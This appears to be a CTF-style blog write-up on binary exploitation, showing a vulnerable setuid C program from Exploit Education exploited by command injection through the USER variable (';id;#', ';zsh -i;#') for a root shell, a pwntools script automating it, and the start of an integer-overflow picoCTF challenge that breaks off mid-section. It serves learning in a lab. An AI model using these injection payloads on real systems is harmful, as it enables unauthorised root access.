<!DOCTYPE html>
<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Binary Exploitationüêà‚Äç‚¨õ - Deadcats</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Binary Exploitation Challenges from Exploit Education" />
	<meta property="og:image" content=""/>
	<meta property="og:url" content="http://localhost:1313/posts/shit/">
  <meta property="og:site_name" content="Deadcats">
  <meta property="og:title" content="Binary Exploitationüêà‚Äç‚¨õ">
  <meta property="og:description" content="Binary Exploitation Challenges from Exploit Education">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-11-13T15:00:00+05:45">
    <meta property="article:modified_time" content="2025-11-13T15:00:00+05:45">
    <meta property="article:tag" content="Binary Exploitation">
    <meta property="article:tag" content="Command Injection">
    <meta property="article:tag" content="Stack Overflow">
    <meta property="article:tag" content="Ret2Shellcode">
    <meta property="article:tag" content="ROP">
    <meta property="article:tag" content="Ret2PLT">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Binary Exploitationüêà‚Äç‚¨õ">
  <meta name="twitter:description" content="Binary Exploitation Challenges from Exploit Education">

        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.7a5c05040394322612a2d98397e9932aa81d9d7acc70199463e79f8180c8e0c0.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.478e7f2b9cf8d87be42edfd9fe1810beab1331847df94b1b430478b309f28282.css"   />
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="http://localhost:1313/">Deadcats</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		<a href="/members">Members</a>
		
		<a href="/tags">Tags</a>
		
		
	</nav>
</header>

<main>
  <article>
    <div class="post-container">
      
      <div class="post-content">
        <div class="title">
          <h1 class="title">Binary Exploitationüêà‚Äç‚¨õ</h1>
          <div class="meta">Posted on Nov 13, 2025</div>
        </div>
        
        <section class="body">
          <p>Binary Exploitation Challenges from Exploit Education</p>
<h1 id="0x1---command-injection">0x1 - Command Injection</h1>
<p>Command injection is not vulnerability we see only in web apps but its in every application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//https://exploit.education/nebula/level-02/
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/types.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>buffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">gid_t</span> gid;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uid_t</span> uid;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  gid <span style="color:#f92672">=</span> <span style="color:#a6e22e">getegid</span>();
</span></span><span style="display:flex;"><span>  uid <span style="color:#f92672">=</span> <span style="color:#a6e22e">geteuid</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresgid</span>(gid, gid, gid);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setresuid</span>(uid, uid, uid);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  buffer <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">asprintf</span>(<span style="color:#f92672">&amp;</span>buffer, <span style="color:#e6db74">&#34;/bin/echo %s is cool&#34;</span>, <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;USER&#34;</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;about to call system(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">system</span>(buffer);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we compile it using <code>gcc -o main main.c</code> and run it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ‚ùØ ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">28</span>
</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">2</span> at0m at0m  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 16:11 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> at0m at0m  <span style="color:#ae81ff">4096</span> Jun <span style="color:#ae81ff">26</span> 16:11 ..
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16304</span> Jun <span style="color:#ae81ff">26</span> 16:11 main
</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ae81ff">1</span> at0m at0m   <span style="color:#ae81ff">444</span> Jun <span style="color:#ae81ff">26</span> 16:11 main.c
</span></span></code></pre></div><p><code>main</code> file has ownership of root so if we could get to run command injection from <code>main</code> file we will be running our command as root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./main                           
</span></span><span style="display:flex;"><span>about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo at0m is cool&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>at0m is cool
</span></span></code></pre></div><p>As we can see it just run system function to print our username. We want to run our command instead of system command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">asprintf</span>(<span style="color:#f92672">&amp;</span>buffer, <span style="color:#e6db74">&#34;/bin/echo %s is cool&#34;</span>, <span style="color:#a6e22e">getenv</span>(<span style="color:#e6db74">&#34;USER&#34;</span>));
</span></span></code></pre></div><p>In above line of code we can see it dynamically creates a string in <code>buffer</code> that runs <code>/bin/echo &lt;username&gt; is cool</code> using the current user‚Äôs name from the environment.</p>
<p>So the only way we can change anything is from <code>USER</code> variable we can change it by running <code>export USER=hacker</code> in our Linux machine. Now if we run it will say:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./main
</span></span><span style="display:flex;"><span>about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo hacker is cool&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>hacker is cool
</span></span></code></pre></div><p>We know in Linux we can use <code>;</code> to run multiple commands like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ id;ls   
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,105<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>main  main.c
</span></span></code></pre></div><p>It ran <code>id</code> then after this it ran <code>ls</code> command. So if we could put <code>;</code> in our <code>USER</code> variable like <code>';id;#'</code> it will run this command as <code>root</code>.</p>
<p>We used <code>;</code> to separate commands, so by setting <code>USER</code> to something like <code>';id;#'</code>, the injected command becomes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/echo <span style="color:#e6db74">&#39;;id;# is cool&#39;</span>
</span></span></code></pre></div><p>We used <code>#</code> as it is used to comment out the rest.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ export USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;;id;#&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./main             
</span></span><span style="display:flex;"><span>about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo ;id;# is cool&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>at0m<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,105<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,125<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>,128<span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Like this we can run our command as root. If we want shell we can use this <code>';zsh -i;#'</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ export USER<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;;zsh -i;#&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>‚ùØ ./main                 
</span></span><span style="display:flex;"><span>about to call system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/echo ;zsh -i;# is cool&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>&lt;SNIP&gt;
</span></span><span style="display:flex;"><span>‚ùØ whoami                 
</span></span><span style="display:flex;"><span>root
</span></span></code></pre></div><p>Writing the exploit we did in Python.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set USER environment variable to inject commands</span>
</span></span><span style="display:flex;"><span>env <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;USER&#39;</span>: <span style="color:#e6db74">&#39;zsh -i;#&#39;</span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start a bash process with the injected environment</span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;bash&#39;</span>, env<span style="color:#f92672">=</span>env)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Send the command to run your file</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;./file&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Give interactive control to the user</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="0x2---integer-overflow">0x2 - Integer Overflow</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">2147483647</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,num<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><p>Here is simple code that adds 1 in <code>2147483647</code>. Running it should give <code>2147483648</code> but:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./file            
</span></span><span style="display:flex;"><span>-2147483648
</span></span></code></pre></div><p>The reason you get <code>-2147483648</code> instead of <code>2147483648</code> is because the <code>int</code> data type in C is a <strong>32-bit signed integer</strong> with a maximum value of <code>2147483647</code>. When you add 1 to this maximum, it causes an <strong>integer overflow</strong>, which wraps around to the minimum value <code>-2147483648</code> due to how signed integers are represented in two‚Äôs complement form. This overflow behavior leads to unexpected negative results instead of the mathematically correct larger number.</p>
<p>If we add <code>10</code> instead of 1.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">2147483647</span>; <span style="color:#75715e">// -2147483647
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,num<span style="color:#f92672">+</span><span style="color:#ae81ff">10</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>} 
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-2147483647 + 10 = -2147483639
</span></span></code></pre></div><p>As we expected we get this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>‚ùØ ./file 
</span></span><span style="display:flex;"><span>-2147483639
</span></span></code></pre></div><p>Like this if we add <code>2147483647</code> in it it will look something like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>-2147483647 + 2147483647 = 0
</span></span></code></pre></div><p>Think of the <code>int</code> like a car‚Äôs odometer that can only show up to 999,999 miles. When the car hits 999,999 and goes one mile further, the odometer ‚Äúrolls over‚Äù back to 000,000. Similarly, when a 32-bit signed integer hits its maximum value (2,147,483,647) and you add 1, it wraps around to its minimum value (-2,147,483,648) due to overflow, just like the odometer rolling over instead of continuing to a larger number.</p>
<p><img src="/img/simpsons.gif" alt="simpsons.gif"></p>
<p>Let&rsquo;s now look at challenge.</p>
<p>File: <a href="https://play.picoctf.org/practice/challenge/49?category=5&amp;page=3">Here</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// https://play.picoctf.org/practice/challenge/49?category<span style="color:#f92672">=</span>5&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
</span></span><span style="display:flex;"><span>int main<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    setbuf<span style="color:#f92672">(</span>stdout, NULL<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>    int con;
</span></span><span style="display:flex;"><span>    con <span style="color:#f92672">=</span> 0;
</span></span><span style="display:flex;"><span>    int account_balance <span style="color:#f92672">=</span> 1100;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>con <span style="color:#f92672">==</span> 0<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Welcome to the flag exchange\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;We sell flags\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n1. Check Account Balance\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n2. Buy Flags\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n3. Exit\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        int menu;
</span></span><span style="display:flex;"><span>        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n Enter a menu selection\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        fflush<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        scanf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%d&#34;</span>, &amp;menu<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>menu <span style="color:#f92672">==</span> 1<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>            printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n\n\n Balance: %d \n\n\n&#34;</span>, account_balance<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>menu <span style="color:#f92672">==</span> 2<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>            printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Currently for sale\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1. Defintely not the flag Flag\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;2. 1337 Flag\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            int auction_choice;
</span></span><span style="display:flex;"><span>            fflush<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            scanf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%d&#34;</span>, &amp;auction_choice<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>auction_choice <span style="color:#f92672">==</span> 1<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>                printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;These knockoff Flags cost 900 each, enter desired quantity\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                int number_flags <span style="color:#f92672">=</span> 0;
</span></span><span style="display:flex;"><span>                fflush<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                scanf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%d&#34;</span>, &amp;number_flags<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>number_flags &gt; 0<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>                    int total_cost <span style="color:#f92672">=</span> 0;
</span></span><span style="display:flex;"><span>                    total_cost <span style="color:#f92672">=</span> 900*number_flags;
</span></span><span style="display:flex;"><span>                    printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\nThe final cost is: %d\n&#34;</span>, total_cost<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>total_cost &lt;<span style="color:#f92672">=</span> account_balance<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>                        account_balance <span style="color:#f92672">=</span> account_balance - total_cost;
</span></span><span style="display:flex;"><span>                        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\nYour current balance after transaction: %d\n\n&#34;</span>, account_balance<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Not enough funds to complete purchase\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                                    
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>auction_choice <span style="color:#f92672">==</span> 2<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>                printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;1337 flags cost 100000 dollars, and we only have 1 in stock\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Enter 1 to buy one&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                int bid <span style="color:#f92672">=</span> 0;
</span></span><span style="display:flex;"><span>                fflush<span style="color:#f92672">(</span>stdin<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                scanf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;%d&#34;</span>, &amp;bid<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>bid <span style="color:#f92672">==</span> 1<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>account_balance &gt; 100000<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>                        FILE *f <span style="color:#f92672">=</span> fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>f <span style="color:#f92672">==</span> NULL<span style="color:#f92672">){</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                            printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;flag file not found\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                            exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                        char buf<span style="color:#f92672">[</span>64<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>                        fgets<span style="color:#f92672">(</span>buf, 63, f<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;YOUR FLAG IS: %s\n&#34;</span>, buf<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        printf<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\nNot enough funds for transaction\n\n\n&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span><span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            con <span style="color:#f92672">=</span> 1;
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> 0;
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><p>It is a program that will give us flag only when our account balance is greater than <code>100000</code> but we don&rsquo;t have enough money. So we somehow have to increase our balance using integer overflow since its pointless to do normally.</p>
<p>The only place where <code>account_balance</code> is being modified is at this line of code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>account_balance <span style="color:#f92672">=</span> account_balance <span style="color:#f92672">-</span> total_cost;
